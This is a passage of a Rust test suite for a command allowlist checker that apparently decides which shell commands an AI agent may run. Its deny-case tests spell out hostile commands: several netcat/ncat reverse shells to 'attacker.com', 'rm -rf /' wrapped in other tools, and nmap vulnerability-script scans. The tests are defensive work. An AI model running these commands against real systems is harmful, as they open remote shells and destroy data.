            dispatch_spec(&toks(&["jj", "--no-pager", "push"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn structured_wrapper_eq_syntax() {
        let spec = load_one(r#"
            [[command]]
            name = "jj"
            [command.wrapper]
            valued = ["--color"]

            [[command.sub]]
            name = "log"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["jj", "--color=auto", "log"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn structured_no_wrapper_unchanged() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"
            bare_flags = ["--help"]

            [[command.sub]]
            name = "test"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "test"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    // ---------------------------------------------------------------
    // Wrapper (delegate inner command)
    // ---------------------------------------------------------------

    #[test]
    fn wrapper_delegates_safe_inner() {
        let spec = load_one(r#"
            [[command]]
            name = "timeout"
            [command.wrapper]
            valued = ["--signal", "--kill-after", "-s", "-k"]
            standalone = ["--preserve-status"]
            positional_skip = 1
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["timeout", "30", "echo", "hello"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn wrapper_rejects_unsafe_inner() {
        let spec = load_one(r#"
            [[command]]
            name = "timeout"
            [command.wrapper]
            positional_skip = 1
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["timeout", "30", "rm", "-rf", "/"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn wrapper_skips_flags_then_delegates() {
        let spec = load_one(r#"
            [[command]]
            name = "timeout"
            [command.wrapper]
            valued = ["--signal", "-s", "--kill-after", "-k"]
            standalone = ["--preserve-status"]
            positional_skip = 1
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["timeout", "-s", "KILL", "60", "echo", "hello"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["timeout", "--preserve-status", "120", "git", "status"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn wrapper_no_inner_denied() {
        let spec = load_one(r#"
            [[command]]
            name = "timeout"
            [command.wrapper]
            positional_skip = 1
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["timeout", "30"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn wrapper_bare_ok() {
        let spec = load_one(r#"
            [[command]]
            name = "env"
            [command.wrapper]
            valued = ["--unset", "-u"]
            standalone = ["--ignore-environment", "-i"]
            bare_ok = true
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["env"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn wrapper_bare_not_ok() {
        let spec = load_one(r#"
            [[command]]
            name = "time"
            [command.wrapper]
            standalone = ["-p"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["time"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn wrapper_with_separator() {
        let spec = load_one(r#"
            [[command]]
            name = "dotenv"
            [command.wrapper]
            valued = ["-c", "-e", "-f", "-v"]
            separator = "--"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["dotenv", "-f", ".env", "--", "git", "status"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn wrapper_simple_no_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "time"
            [command.wrapper]
            standalone = ["-p"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["time", "git", "log"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["time", "-p", "git", "log"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn wrapper_nested_delegation() {
        let spec = load_one(r#"
            [[command]]
            name = "nice"
            [command.wrapper]
            valued = ["-n", "--adjustment"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["nice", "-n", "10", "cargo", "test"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeRead),
        );
    }

    // Multiple commands in one file
    // ---------------------------------------------------------------

    #[test]
    fn multiple_commands() {
        let specs = load_toml(r#"
            [[command]]
            name = "cat"
            bare = true
            standalone = ["-n"]

            [[command]]
            name = "head"
            bare = false
            valued = ["-n"]
        "#, "test");
        assert_eq!(specs.len(), 2);
        assert_eq!(specs[0].name, "cat");
        assert_eq!(specs[1].name, "head");
    }

    // ---------------------------------------------------------------
    // Edge cases
    // ---------------------------------------------------------------

    #[test]
    fn valued_flag_at_end_without_value() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            valued = ["--max-count"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "--max-count"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn bare_dash_as_stdin() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            standalone = ["-r"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "pattern", "-"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn tolerate_unknown_long_eq_form() {
        let spec = load_one(r#"
            [[command]]
            name = "echo"
            bare = true
            tolerate_unknown_long = true
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["echo", "--foo=bar"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn tolerate_unknown_long_with_max() {
        let spec = load_one(r#"
            [[command]]
            name = "echo"
            bare = true
            tolerate_unknown_long = true
            max_positional = 2
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["echo", "--a", "--b"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["echo", "--a", "--b", "--c"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn tolerate_unknown_short_denies_unknown_double_dash() {
        // The whole point of the narrow split: short-tolerance does not
        // accept --unknown.
        let spec = load_one(r#"
            [[command]]
            name = "echo"
            bare = true
            tolerate_unknown_short = true
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["echo", "--evil"]), &spec),
            Verdict::Denied,
        );
        // Single-dash long words still pass.
        assert_eq!(
            dispatch_spec(&toks(&["echo", "-help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    // ---------------------------------------------------------------
    // Integration: TOML registry rejects unknown flags
    // ---------------------------------------------------------------

    #[test]
    fn toml_registry_rejects_unknown_flags() {
        let mut failures = Vec::new();
        for (name, spec) in TOML_REGISTRY.iter() {
            match &spec.kind {
                DispatchKind::Policy { policy, .. } | DispatchKind::RequireAny { policy, .. }
                    // Skip only commands that explicitly accept double-dash
                    // unknowns (the dangerous tolerance). Commands using just
                    // `tolerate_unknown_short` are still tested — the whole
                    // point of the narrow split is that they correctly deny
                    // double-dash unknowns.
                    if policy.tolerance.unknown.allows_long() => continue,
                DispatchKind::Custom { .. } => continue,
                _ => {}
            }
            let test = format!("{name} --xyzzy-unknown-42");
            if crate::is_safe_command(&test) {
                failures.push(format!("{name}: accepted unknown flag"));
            }
        }
        assert!(failures.is_empty(), "TOML commands accepted unknown flags:\n{}", failures.join("\n"));
    }

    /// Data-defined spec: every TOML can declare `examples_safe` and
    /// `examples_denied` strings that exercise canonical and alias
    /// invocations. This test runs each through `is_safe_command` and
    /// flags any drift between the TOML and the runtime dispatcher.
    /// Use to lock in alias correctness, security boundaries, and
    /// representative agent invocations.
    #[test]
    fn toml_examples_match_dispatch() {
        let mut failures = Vec::new();
        for (name, spec) in TOML_REGISTRY.iter() {
            // Skip alias entries — examples live on the canonical spec only.
            if name != &spec.name {
                continue;
            }
            for ex in &spec.examples_safe {
                if !crate::is_safe_command(ex) {
                    failures.push(format!("{}: examples_safe rejected: {ex:?}", spec.name));
                }
            }
            for ex in &spec.examples_denied {
                if crate::is_safe_command(ex) {
                    failures.push(format!("{}: examples_denied accepted: {ex:?}", spec.name));
                }
            }
        }
        assert!(failures.is_empty(),
            "TOML examples drift from dispatcher:\n{}", failures.join("\n"));
    }

    /// Regression guard: `examples_safe`/`examples_denied` must appear
    /// before any `[[command.sub]]` or `[command.fallback]` table in
    /// each TOML file. TOML semantics scope inline keys to the
    /// most-recently-opened table, so examples written *after* a
    /// nested table silently get attached to that table and dropped
    /// from the command. Walks every `commands/**/*.toml` and asserts
    /// each `[[command]]` block that mentions an `examples_*` field
    /// produces a non-empty list on the parsed spec.
    #[test]
    fn examples_appear_before_nested_tables_in_every_toml() {
        use std::fs;
        use std::path::PathBuf;

        fn walk(dir: &std::path::Path, out: &mut Vec<PathBuf>) {
            for entry in fs::read_dir(dir).unwrap() {
                let entry = entry.unwrap();
                let path = entry.path();
                if path.is_dir() {
                    walk(&path, out);
                } else if path.extension().and_then(|e| e.to_str()) == Some("toml") {
                    if path.file_name().and_then(|n| n.to_str()) == Some("SAMPLE.toml") {
                        continue;
                    }
                    out.push(path);
                }
            }
        }

        let mut files = Vec::new();
        walk(std::path::Path::new("commands"), &mut files);
        assert!(!files.is_empty(), "expected commands/ to contain TOML files");

        let mut failures = Vec::new();
        for path in files {
            let source = fs::read_to_string(&path).unwrap();
            let parsed: toml::Value = match toml::from_str(&source) {
                Ok(v) => v,
                Err(e) => {
                    failures.push(format!("{}: parse error: {e}", path.display()));
                    continue;
                }
            };
            let Some(cmds) = parsed.get("command").and_then(|v| v.as_array()) else {
                continue;
            };
            for cmd in cmds {
                let Some(name) = cmd.get("name").and_then(|v| v.as_str()) else {
                    continue;
                };
                if source.contains("examples_safe")
                    && cmd.get("examples_safe").is_none()
                {
                    failures.push(format!(
                        "{}: command `{name}` — `examples_safe` text in file but \
                         not attached to [[command]] (move it above any \
                         [[command.sub]] / [command.fallback] table)",
                        path.display(),
                    ));
                }
                if source.contains("examples_denied")
                    && cmd.get("examples_denied").is_none()
                {
                    failures.push(format!(
                        "{}: command `{name}` — `examples_denied` text in file \
                         but not attached to [[command]] (move it above any \
                         [[command.sub]] / [command.fallback] table)",
                        path.display(),
                    ));
                }
            }
        }
        assert!(
            failures.is_empty(),
            "TOML examples misordered:\n{}",
            failures.join("\n"),
        );
    }

    #[test]
    fn handler_with_subs_and_fallback_builds_custom_kind() {
        // Verify that a handler-using TOML carries its [[command.sub]]
        // and [command.fallback] data through into DispatchKind::Custom.
        // Without this, try_sub_dispatch / try_fallback_grammar would
        // see empty data and silently deny everything the handler asks
        // about.
        let spec = load_one(r#"
[[command]]
name = "demo-handler"
handler = "demo"

[[command.sub]]
name = "diag"
max_positional = 0

[command.fallback]
level = "Inert"
bare = true
max_positional = 1
positional_shape = "path"
standalone = ["--help", "-h"]
"#);
        match &spec.kind {
            DispatchKind::Custom { handler_name, subs, fallback, .. } => {
                assert_eq!(handler_name, "demo");
                let names: Vec<_> = subs.iter().map(|s| s.name.as_str()).collect();
                assert_eq!(names, vec!["diag"]);
                let f = fallback.as_ref().expect("fallback present");
                assert_eq!(f.level, SafetyLevel::Inert);
                assert_eq!(f.policy.max_positional, Some(1));
                assert_eq!(
                    f.positional_shape,
                    Some(crate::policy::PositionalShape::Path),
                );
            }
            other => panic!("expected Custom, got {other:?}"),
        }
    }

    #[test]
    fn fallback_without_handler_panics() {
        let result = std::panic::catch_unwind(|| {
            load_one(r#"
[[command]]
name = "demo-orphan-fallback"
bare = true

[command.fallback]
level = "Inert"
bare = true
"#);
        });
        assert!(
            result.is_err(),
            "fallback declared without a handler should panic — \
             try_fallback_grammar is only invoked from handlers, so the \
             block is dead config",
        );
    }

    #[test]
    fn unknown_positional_shape_panics() {
        let result = std::panic::catch_unwind(|| {
            load_one(r#"
[[command]]
name = "demo-bad-shape"
handler = "demo"

[command.fallback]
level = "Inert"
positional_shape = "not-a-real-shape"
"#);
        });
        assert!(
            result.is_err(),
            "loading an unknown positional_shape should panic with diagnostic",
        );
    }

    #[test]
    fn handler_without_fallback_field_has_none() {
        // Regression: a handler-using TOML with no [command.fallback]
        // block must produce `fallback: None` so try_fallback_grammar
        // returns None and the handler can deny.
        let spec = load_one(r#"
[[command]]
name = "demo-no-fallback"
handler = "demo"
"#);
        match &spec.kind {
            DispatchKind::Custom { subs, fallback, .. } => {
                assert!(subs.is_empty());
                assert!(fallback.is_none());
            }
            other => panic!("expected Custom, got {other:?}"),
        }
    }

    #[test]
    fn deny_field_denies_every_invocation() {
        let source = r#"
[[command]]
name = "demo-deny"
deny = true
"#;
        let specs = load_toml(source, "test");
        let map = build_registry(specs);
        let spec = map.get("demo-deny").expect("demo-deny in registry");
        for case in ["demo-deny", "demo-deny --help", "demo-deny foo bar", "demo-deny -x"] {
            let parsed = toks(&case.split_whitespace().collect::<Vec<_>>());
            assert_eq!(
                dispatch_spec(&parsed, spec),
                Verdict::Denied,
                "expected denied: {case}",
            );
        }
    }

    #[test]
    fn insert_spec_replaces_aliases() {
        let original = load_toml(r#"
[[command]]
name = "original-tool"
aliases = ["o", "orig"]
url = "x"
description = "first"
bare_flags = ["--help"]
"#, "test");
        let mut map = build_registry(original);
        assert!(map.contains_key("o"));
        assert!(map.contains_key("orig"));

        let override_spec = load_toml(r#"
[[command]]
name = "original-tool"
deny = true
"#, "test").into_iter().next().unwrap();
        super::build::insert_spec(&mut map, override_spec);

        assert!(!map.contains_key("o"), "stale alias 'o' must be removed");
        assert!(!map.contains_key("orig"), "stale alias 'orig' must be removed");
        let spec = &map["original-tool"];
        let parsed = toks(&["original-tool", "--help"]);
        assert_eq!(dispatch_spec(&parsed, spec), Verdict::Denied);
    }

    #[test]
    fn toml_hash_commands_work() {
        assert!(crate::is_safe_command("md5sum file.txt"));
        assert!(crate::is_safe_command("sha256sum file.txt"));
        assert!(crate::is_safe_command("b2sum file.txt"));
        assert!(crate::is_safe_command("shasum -a 256 file.txt"));
        assert!(crate::is_safe_command("cksum file.txt"));
        assert!(crate::is_safe_command("md5 file.txt"));
        assert!(crate::is_safe_command("sum file.txt"));
        assert!(crate::is_safe_command("md5sum --check checksums.md5"));
    }

    #[test]
    fn toml_hash_commands_reject_unknown() {
        assert!(!crate::is_safe_command("md5sum --evil"));
        assert!(!crate::is_safe_command("sha256sum --evil"));
        assert!(!crate::is_safe_command("b2sum --evil"));
    }

    #[test]
    fn toml_fd_allowed() {
        assert!(crate::is_safe_command("fd pattern"));
        assert!(crate::is_safe_command("fd -H pattern"));
        assert!(crate::is_safe_command("fd -t f pattern"));
        assert!(crate::is_safe_command("fd -e rs pattern"));
        assert!(crate::is_safe_command("fd -g '*.rs'"));
        assert!(crate::is_safe_command("fd -L pattern"));
        assert!(crate::is_safe_command("fd -a pattern"));
        assert!(crate::is_safe_command("fd --color auto pattern"));
        assert!(crate::is_safe_command("fd --max-depth 3 pattern"));
    }

    #[test]
    fn toml_fd_denied() {
        assert!(!crate::is_safe_command("fd pattern --exec rm"));
        assert!(!crate::is_safe_command("fd pattern -x rm"));
        assert!(!crate::is_safe_command("fd -t f pattern --exec-batch rm"));
        assert!(!crate::is_safe_command("fd pattern -X rm"));
        assert!(!crate::is_safe_command("fd -xH pattern"));
        assert!(!crate::is_safe_command("fd -HX pattern"));
        assert!(!crate::is_safe_command("fd"));
    }

    #[test]
    fn toml_kafka_topics_allowed() {
        assert!(crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --list"));
        assert!(crate::is_safe_command("kafka-topics --list --bootstrap-server localhost:9092"));
        assert!(crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --describe --topic foo"));
        assert!(crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --describe --under-replicated-partitions"));
        assert!(crate::is_safe_command("kafka-topics --help"));
    }

    #[test]
    fn toml_kafka_topics_denied() {
        assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --delete --topic foo"));
        assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --create --topic foo"));
        assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --alter --topic foo"));
        assert!(!crate::is_safe_command("kafka-topics --bootstrap-server localhost:9092 --list --create"));
        assert!(!crate::is_safe_command("kafka-topics"));
    }

    #[test]
    fn toml_kafka_consumer_groups_allowed() {
        assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --list"));
        assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --group mbc --describe"));
        assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --describe --group mbc"));
        assert!(crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --describe --all-groups"));
    }

    #[test]
    fn toml_kafka_consumer_groups_denied() {
        assert!(!crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --reset-offsets"));
        assert!(!crate::is_safe_command("kafka-consumer-groups --bootstrap-server localhost:9092 --delete"));
        assert!(!crate::is_safe_command("kafka-consumer-groups"));
    }

    #[test]
    fn toml_kafka_console_consumer_allowed() {
        assert!(crate::is_safe_command(
            "kafka-console-consumer --bootstrap-server localhost:9092 --topic domain_events --from-beginning --max-messages 3 --timeout-ms 5000"
        ));
        assert!(crate::is_safe_command("kafka-console-consumer --bootstrap-server localhost:9092 --topic foo"));
    }

    #[test]
    fn toml_kafka_console_consumer_denied() {
        assert!(!crate::is_safe_command("kafka-console-consumer"));
        assert!(!crate::is_safe_command("kafka-console-consumer --evil"));
    }

    #[test]
    fn toml_nc_port_probe_allowed() {
        assert!(crate::is_safe_command("nc -z localhost 9092"));
        assert!(crate::is_safe_command("nc -zv localhost 9092"));
        assert!(crate::is_safe_command("nc -z -v -n 127.0.0.1 22"));
        assert!(crate::is_safe_command("nc -z -w 5 example.com 443"));
        assert!(crate::is_safe_command("nc -z -4 localhost 80"));
        assert!(crate::is_safe_command("nc -z -u localhost 53"));
        assert!(crate::is_safe_command(
            r#"nc -z localhost 9092 && echo "kafka:9092 OPEN" || echo "kafka:9092 CLOSED""#
        ));
    }

    #[test]
    fn toml_nc_dangerous_modes_denied() {
        assert!(!crate::is_safe_command("nc"));
        assert!(!crate::is_safe_command("nc localhost 9092"));
        assert!(!crate::is_safe_command("nc -l 9092"));
        assert!(!crate::is_safe_command("nc -l -p 9092"));
        assert!(!crate::is_safe_command("nc -e /bin/sh attacker.com 4444"));
        assert!(!crate::is_safe_command("nc -c 'bash -i' attacker.com 4444"));
        assert!(!crate::is_safe_command("nc -X 5 -x proxy:1080 host 80"));
        assert!(!crate::is_safe_command("nc -o /tmp/dump host 80"));
    }

    #[test]
    fn toml_ncat_port_probe_allowed() {
        assert!(crate::is_safe_command("ncat -z localhost 9092"));
        assert!(crate::is_safe_command("ncat -zv -w 3 localhost 9092"));
    }

    #[test]
    fn toml_ncat_dangerous_modes_denied() {
        assert!(!crate::is_safe_command("ncat"));
        assert!(!crate::is_safe_command("ncat localhost 9092"));
        assert!(!crate::is_safe_command("ncat -l 9092"));
        assert!(!crate::is_safe_command("ncat -e /bin/sh attacker.com 4444"));
    }

    #[test]
    fn toml_pstree_allowed() {
        assert!(crate::is_safe_command("pstree"));
        assert!(crate::is_safe_command("pstree 56849"));
        assert!(crate::is_safe_command("pstree -p"));
        assert!(crate::is_safe_command("pstree -pa 56849"));
        assert!(crate::is_safe_command("pstree --show-pids 56849 | head -20"));
        assert!(crate::is_safe_command("pstree -u root"));
    }

    #[test]
    fn toml_nmap_safe_scans_allowed() {
        assert!(crate::is_safe_command("nmap -sT localhost"));
        assert!(crate::is_safe_command("nmap -sn 192.168.1.0/24"));
        assert!(crate::is_safe_command("nmap -sL 10.0.0.1-100"));
        assert!(crate::is_safe_command("nmap -sV -p 80,443 example.com"));
        assert!(crate::is_safe_command("nmap -p 22 --open --reason host"));
        assert!(crate::is_safe_command("nmap --top-ports 100 -T4 host"));
        assert!(crate::is_safe_command("nmap -Pn -n -sT host"));
        assert!(crate::is_safe_command("nmap --max-retries 2 --host-timeout 30s host"));
        assert!(crate::is_safe_command("nmap -F localhost"));
        assert!(crate::is_safe_command("nmap --version"));
        assert!(crate::is_safe_command("nmap -V"));
    }

    #[test]
    fn toml_nmap_dangerous_modes_denied() {
        assert!(!crate::is_safe_command("nmap"));
        assert!(!crate::is_safe_command("nmap --script vuln host"));
        assert!(!crate::is_safe_command("nmap --script=http-shellshock host"));
        assert!(!crate::is_safe_command("nmap --script-args user=admin host"));
        assert!(!crate::is_safe_command("nmap -A host"));
        assert!(!crate::is_safe_command("nmap -O host"));
        assert!(!crate::is_safe_command("nmap -sU host"));
        assert!(!crate::is_safe_command("nmap -sS host"));
        assert!(!crate::is_safe_command("nmap -sF host"));
        assert!(!crate::is_safe_command("nmap -iL targets.txt"));
        assert!(!crate::is_safe_command("nmap -oN out.txt host"));
        assert!(!crate::is_safe_command("nmap -oA scan host"));
        assert!(!crate::is_safe_command("nmap --data-string EVIL host"));
        assert!(!crate::is_safe_command("nmap --scanflags SYNFIN host"));
        assert!(!crate::is_safe_command("nmap --privileged host"));
        assert!(!crate::is_safe_command("nmap --resume scan.gnmap"));
        assert!(!crate::is_safe_command("nmap --script-updatedb"));
    }

    #[test]
    fn toml_monolith_allowed() {
        assert!(crate::is_safe_command("monolith https://example.com"));
        assert!(crate::is_safe_command("monolith -j -i https://example.com"));
        assert!(crate::is_safe_command("monolith --no-audio --no-video https://example.com"));
        assert!(crate::is_safe_command("monolith -C /tmp/cookies.txt https://example.com"));
        assert!(crate::is_safe_command("monolith -u 'Mozilla/5.0' https://example.com"));
        assert!(crate::is_safe_command("monolith --timeout 30 https://example.com"));
        assert!(crate::is_safe_command("monolith https://example.com > /dev/null"));
    }

    #[test]
    fn toml_monolith_denied() {
        assert!(!crate::is_safe_command("monolith"));
        assert!(!crate::is_safe_command("monolith https://example.com -o /tmp/out.html"));
        assert!(!crate::is_safe_command("monolith -o - https://example.com"));
        assert!(!crate::is_safe_command("monolith --unknown https://example.com"));
    }

    #[test]
    fn toml_jai_allowed() {
        assert!(crate::is_safe_command("jai cat /tmp/foo"));
        assert!(crate::is_safe_command("jai grep pattern /tmp/foo"));
        assert!(crate::is_safe_command("jai --casual rg pattern src/"));
        assert!(crate::is_safe_command("jai --strict sleep 1"));
        assert!(crate::is_safe_command("jai claude plugin info foo"));
    }

    #[test]
    fn toml_jai_denied() {
        assert!(!crate::is_safe_command("jai rm -rf /"));
        assert!(!crate::is_safe_command("jai"));
        assert!(!crate::is_safe_command("jai bash"));
        assert!(!crate::is_safe_command("jai --unknown-flag cat /tmp/x"));
        assert!(!crate::is_safe_command("jai --casual bash -c 'rm -rf /'"));
        assert!(!crate::is_safe_command("jai -- rm -rf /"));
    }

    #[test]
    fn toml_claude_plugin_info_allowed() {
        assert!(crate::is_safe_command("claude plugin info mbc@mbc-plugins"));
        assert!(crate::is_safe_command("claude plugins info mbc@mbc-plugins"));
    }

    #[test]
    fn toml_plutil_convert_allowed() {
        assert!(crate::is_safe_command("plutil -convert xml1 -o - /tmp/foo.plist"));
        assert!(crate::is_safe_command("plutil -convert binary1 -o - /tmp/foo.plist"));
        assert!(crate::is_safe_command("plutil -convert json -r -o - /tmp/foo.plist"));
        assert!(crate::is_safe_command("plutil -convert xml1 -o -"));
    }

    #[test]
    fn toml_plutil_convert_denied() {
        assert!(!crate::is_safe_command("plutil -convert xml1 /tmp/foo.plist"));
        assert!(!crate::is_safe_command("plutil -convert xml1 -o /tmp/out.plist /tmp/in.plist"));
        assert!(!crate::is_safe_command("plutil -convert invalid -o - /tmp/in"));
        assert!(!crate::is_safe_command("plutil -convert xml1 -e plist -o - /tmp/in"));
    }

    fn check_toml_unknown(prefix: &str, kind: &DispatchKind, failures: &mut Vec<String>) {
        match kind {
            DispatchKind::Branching { subs, .. } => {
                for sub in subs {
                    check_toml_unknown(&format!("{prefix} {}", sub.name), &sub.kind, failures);
                }
            }
            DispatchKind::Policy { policy, .. } | DispatchKind::RequireAny { policy, .. }
                if !policy.tolerance.unknown.allows_long() =>
            {
                let test = format!("{prefix} --xyzzy-unknown-42");
                if crate::is_safe_command(&test) {
                    failures.push(format!("{prefix}: accepted unknown flag"));
                }
            }
            DispatchKind::WriteFlagged { policy, .. } if !policy.tolerance.unknown.allows_long() => {
                let test = format!("{prefix} --xyzzy-unknown-42");
                if crate::is_safe_command(&test) {
                    failures.push(format!("{prefix}: accepted unknown flag"));
                }
            }
            _ => {}
        }
    }

    #[test]
    fn toml_specs_reject_unknown() {
        let mut failures = Vec::new();
        for (name, spec) in super::TOML_REGISTRY.iter() {
            if name != &spec.name { continue; }
            check_toml_unknown(&spec.name, &spec.kind, &mut failures);
        }
        assert!(failures.is_empty(), "TOML specs accepted unknown flags:\n{}", failures.join("\n"));
    }

    fn collect_strict_paths() -> Vec<String> {
        let mut paths = Vec::new();
        for (name, spec) in super::TOML_REGISTRY.iter() {
            if name != &spec.name { continue; }
            collect_strict_inner(&spec.name, &spec.kind, &mut paths);
        }
        paths
    }

    fn collect_strict_inner(prefix: &str, kind: &DispatchKind, paths: &mut Vec<String>) {
        match kind {
            DispatchKind::Branching { subs, .. } => {
                for sub in subs {
                    collect_strict_inner(&format!("{prefix} {}", sub.name), &sub.kind, paths);
                }
            }
            DispatchKind::Policy { policy, .. } | DispatchKind::RequireAny { policy, .. }
                if !policy.tolerance.unknown.allows_long() =>
            {
                paths.push(prefix.to_string());
            }
            DispatchKind::WriteFlagged { policy, .. } if !policy.tolerance.unknown.allows_long() => {
                paths.push(prefix.to_string());
            }
            _ => {}
        }
    }

    proptest::proptest! {
        #[test]
        fn toml_strict_reject_random_flags(
            seed in 0..1000usize,
            suffix in "[a-z]{5,10}"
        ) {
            let paths = collect_strict_paths();
            if paths.is_empty() { return Ok(()); }
            let path = &paths[seed % paths.len()];
            let test = format!("{path} --xyzzy-{suffix}");
            proptest::prop_assert!(!crate::is_safe_command(&test),
                "accepted random flag: {test}");
        }
    }

    #[test]
    fn all_toml_commands_have_description() {
        let mut missing = Vec::new();
        for (key, spec) in TOML_REGISTRY.iter() {
            if *key != spec.name {
                continue;
            }
            if spec.description.is_empty() {
                missing.push(spec.name.as_str());
            }
        }
        assert!(
            missing.is_empty(),
            "{} TOML commands missing description:\n{}",
            missing.len(),
            missing.join(", "),
        );
    }

    #[test]
    fn researched_version_round_trips() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "demo-cli 1.9.0 (2026-05-08)"
        "#);
        assert_eq!(
            spec.researched_version.as_deref(),
            Some("demo-cli 1.9.0 (2026-05-08)"),
        );
    }

    #[test]
    fn researched_version_optional_defaults_to_none() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
        "#);
        assert!(spec.researched_version.is_none());
    }

    #[test]
    fn researched_version_does_not_render_in_docs() {
        // Internal-only field — not rendered as part of the command
        // doc body. Future commits can add a separate documentation
        // surface; today the field is purely a tripwire for the next
        // re-research pass.
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "9.9.9"
        "#);
        let doc = spec.to_command_doc();
        assert!(
            !doc.description.contains("9.9.9"),
            "researched_version leaked into doc body: {}",
            doc.description,
        );
    }

    #[test]
    fn handler_command_with_doc_body_renders_body() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            handler = "demo_handler"
            doc_body = "- Allowed standalone flags: --foo\n- Allowed valued flags: --bar"
        "#);
        let doc = spec.to_command_doc();
        assert!(doc.description.contains("--foo"), "body missing --foo: {}", doc.description);
        assert!(doc.description.contains("--bar"), "body missing --bar: {}", doc.description);
    }

    #[test]
    fn handler_command_without_doc_body_renders_empty() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            handler = "demo_handler"
        "#);
        let doc = spec.to_command_doc();
        assert_eq!(doc.description, "");
    }

    #[test]
    fn handler_command_renders_delegating_subs() {
        // Regression: subs whose kind is DelegateSkip / DelegateAfterSeparator
        // used to render nothing in SubSpec::doc_line, so handler-using
        // commands like magick (delegate_skip = 0 on convert/identify) and
        // php (delegate_skip = 0 on artisan/please) silently dropped
        // those subs from auto-rendered docs. They must surface as
        // delegation lines now.
        let spec = load_one(r#"
[[command]]
name = "demo-delegate"
handler = "demo_handler"

[[command.sub]]
name = "passthrough"
delegate_skip = 0

[[command.sub]]
name = "after"
delegate_after = "--"
"#);
        let doc = spec.to_command_doc();
        assert!(
            doc.description.contains("**passthrough**"),
            "delegate_skip sub label must render: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("**after**"),
            "delegate_after sub label must render: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("delegates"),
            "delegation must be indicated: {}",
            doc.description,
        );
    }

    #[test]
    fn handler_command_renders_subs_and_fallback_data() {
        // Auto-render: a handler-using command's [[command.sub]] and
        // [command.fallback] data must surface in the doc description
        // alongside any handwritten doc_body, so docs stay in sync with
        // the TOML allowlist instead of relying on hand-edited prose.
        let spec = load_one(r#"
[[command]]
name = "demo-render"
handler = "demo_handler"
doc_body = "Routing prose explaining the dispatch."

[[command.sub]]
name = "diag"
standalone = ["--help", "-h"]
max_positional = 0

[[command.sub]]
name = "list"
level = "SafeRead"
standalone = ["--help"]

[command.fallback]
level = "Inert"
bare = true
max_positional = 1
positional_shape = "path"
standalone = ["--help"]
valued = ["--type"]
"#);
        let doc = spec.to_command_doc();
        assert!(
            doc.description.contains("Routing prose explaining"),
            "doc_body must still render: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("**diag**"),
            "TOML-declared sub `diag` must render: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("**list**"),
            "TOML-declared sub `list` must render: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("Fallback grammar"),
            "fallback grammar header must render: {}",
            doc.description,
        );
